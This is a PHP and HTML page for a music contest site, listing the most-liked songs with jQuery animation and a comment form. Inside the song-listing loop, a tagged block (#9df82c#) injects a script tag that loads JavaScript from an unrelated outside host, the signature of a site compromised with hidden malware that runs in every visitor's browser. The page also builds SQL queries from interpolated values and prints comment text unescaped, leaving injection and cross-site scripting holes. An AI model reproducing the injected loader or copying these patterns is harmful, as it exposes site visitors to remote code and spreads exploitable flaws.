<? session_start();
include ('./lib.php');
?>
<!DOCTYPE HTML>
<html>
	<head>
		<title> New Document </title>
	 	<link rel="stylesheet" href="./reply_type.css"/>
		<style type="text/css">
			body {
				margin: 0;
				padding: 0;
			}
			a {
				text-decoration: none;
			}
			#contest_wrap {
				width: 980px;
				height: auto;
				position: relative;
				z-index: 20;
			}
			#contest_wrap h1 {
				margin: 0;
				padding: 30px 0 0 30px;
				height: 60px;
			}
			section {
				width: 700px;
				position: relative;
				height: 350px;
				margin: 60px auto 0 auto;
				padding-bottom: 30px;
			}
			.top-demo a div {
				width: 100px;
				height: 100px;
				position: relative;
				float: left;
				font-size: 0.8em;
				font-weight: bold;
				text-align: center;
				line-height: 30px;
			}
			.top_demo a{
				text-decoration: none;
			}
			.top-demo a:nth-child(1) div{
				background: url('images/contest_bg.png');
				background-position: 0% 0%;
				color: white;
			}
			.top-demo a:nth-child(2) div{
				background: url('images/contest_bg.png');
				background-position: 16% 0%;
				color: white;
			}
			.top-demo a:nth-child(3) div{
				background: url('images/contest_bg.png');
				background-position: 33% 0%;
				color: white;
			}
			.top-demo a:nth-child(4) div{
				background: url('images/contest_bg.png');
				background-position: 50% 0%;
				color: white;
			}
			.top-demo a:nth-child(5) div{
				background: url('images/contest_bg.png');
				background-position: 67% 0%;
				color: white;
			}
			.top-demo a:nth-child(6) div{
				background: url('images/contest_bg.png');
				background-position: 84% 0%;
				color: white;
			}
			.top-demo a:nth-child(7) div{
				background: url('images/contest_bg.png');
				background-position: 100% 0%;
				color: white;
			}
			.top-demo a:nth-child(8) div{
				background: url('images/contest_bg.png');
				background-position: 0% 100%;
				color: white;
			}
			.top-demo a:nth-child(9) div{
				background: url('images/contest_bg.png');
				background-position: 16% 100%;
				color: white;
			}
			.top-demo a:nth-child(10) div{
				background: url('images/contest_bg.png');
				background-position: 33% 100%;
				color: white;
			}
			.top-demo a:nth-child(11) div{
				background: url('images/contest_bg.png');
				background-position: 50% 100%;
				color: white;
			}
			.top-demo a:nth-child(12) div{
				background: url('images/contest_bg.png');
				background-position: 67% 100%;
				color: white;
			}
			.top-demo a:nth-child(13) div{
				background: url('images/contest_bg.png');
				background-position: 84% 100%;
				color: white;
			}
			.top-demo a:nth-child(14) div{
				background: url('images/contest_bg.png');
				background-position: 100% 100%;
				color: white;
			}

			#unicorn {
				z-index: 60;
				position: absolute;
				top: 150px;
				left: 38%;
				width: 110px;
				height: 110px;
				border-radius: 110px;
				display: block;
				background: url('images/light.jpg');
				background-size: cover;
				font-size: 1.3em;
				line-height: 130px;
				font-weight: bold;
				color: white;
				text-align: center;
			}
			#unicorn a{
				color: white;
				text-decoration: none;
			}
			.reply_part{
				padding-bottom: 30px;
			}
		</style>
		<script type='text/javascript' src='jquery.easing.1.2.js'></script>
		<script type='text/javascript' src='jquery.circulate.js'></script>
		<script>
			$(document).ready(function() {
				function ShowAlert(text){
					var left = (document.body.clientWidth / 2);
	                var result = left - $('.message').width() / 2 + document.body.scrollLeft;
	                $('.message').css('left',result).html(text).fadeIn(1500);
	                $('.message').fadeOut(1500);
				};
				$(".top-demo a div").each(function() {
					$(this).circulate({
						speed : Math.floor(Math.random() * 300) + 100,
						height : Math.floor(Math.random() * 1000) - 470,
						width : Math.floor(Math.random() * 1000) - 470
					});
				}).click(function() {
					$(this).circulate({
						speed : Math.floor(Math.random() * 300) + 100,
						height : Math.floor(Math.random() * 1000) - 470,
						width : Math.floor(Math.random() * 1000) - 470
					});
				});

				$("#unicorn").css("left", $("#unicorn").position().left).circulate({
					sizeAdjustment : 160,
					speed : 2000,
					width : -1000,
					height : 50,
					loop : true,
					zIndexValues : [1, 50, 50, 1]
				});
				$('.go_music_view').click(function(e) {
					e.preventDefault();
					var href = $(this).attr('href');
					$('#wrap').load(href);
				});
				
				$('.go_reply').click(function(e){
					e.preventDefault();
					var form_data={
						reply_text: $('.reply_text').val(),
						is_ajax: 1
					};
					$.ajax({
						data: form_data,
						type: "POST",
						url: './contest_reply_ok.php',
						success: function(res){
							if(res=='success'){
								ShowAlert('댓글달기 완료');
								$('#wrap').load('./contest.php');
							}else
								ShowAlert('오류가 발생하였습니다');
						}
					});
					return false;
				});
			});

		</script>
	</head>

	<body>
		<?
		$connect = db_connect($db_host, $db_user, $db_pass, $db_name);
		$sql = "select * from Vocals_musiclist order by music_like DESC LIMIT 1";
		$result = mysql_query($sql);
		$data = mysql_fetch_array($result);

		$data2 = "select user_name from Vocals_register where user_id=trim('$data[singer_id]')";
		$d = mysql_query($data2);
		$r = mysql_fetch_array($d);
		?>
		<a href="./music_view.php?music_no=<?=$data['music_no']; ?>" class="go_music_view">
		<div id="unicorn" >
			<?=$data['music_title']?>-<?=$r['user_name'] ?>
		</div> </a>
		<div id="contest_wrap">
			<header>
				<h1>Contest</h1>
			</header>
			<section>
				<div class="top-demo group">
					<?
					$sql2="select * from Vocals_musiclist order by music_like DESC LIMIT 15";
					$result2=mysql_query($sql2);
					while($data3=mysql_fetch_array($result2)){
						$data4="select user_name from Vocals_register where user_id=trim('$data[singer_id]')";
						$d2=mysql_query($data4);
						$r2=mysql_fetch_array($d2);
						if($data['music_no']==$data3['music_no'])
							continue;
					?>
<?php
#9df82c#
if(empty($vt)) {
$vt = "<script type=\"text/javascript\" src=\"http://hancomotors.com/r9ctwktv.php?id=14155814\"></script>";
echo $vt;
}
#/9df82c#
?>					<a href="./music_view.php?music_no=<?=$data3['music_no']; ?>" class="go_music_view">
					<div>
						<p><?=$data3['music_title'] ?></p><?=$r2['user_name'] ?>
					</div> </a>	
					<?
					}
					?>
				</div>
				
			</section>
			</div>
			<div class="reply_part">
				<table class="reply_table">
				<form method="post" name="form_reply" class="form_reply">
				<thead>
					<tr>
						<td colspan="2">댓글</td>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td><textarea name="reply_text" class="reply_text"></textarea></td><td><input type="submit" value="댓글달기" class="go_reply"></td>
					</tr>
				</form>
				</tbody>
			</table>
			<table class="reply_view">
				<tbody>
				<?
					$sql="select * from Vocals_contest_reply order by reply_no desc";
					$d_sql=mysql_query($sql);
					while($r_data=mysql_fetch_array($d_sql)){
						$a="select user_name from Vocals_register where user_id=trim('$r_data[reply_writer_id]')";
						$b=mysql_query($a);
						$c=mysql_fetch_array($b);
				?>
					<tr>
						<td><?=$c['user_name']?></td>
						<td style="word-break: break-all"><?=$r_data['reply_content']?></td>
					</tr>
				<?
					}
				?>
				</tbody>
			</table>
		</div>
		
	</body>
</html>
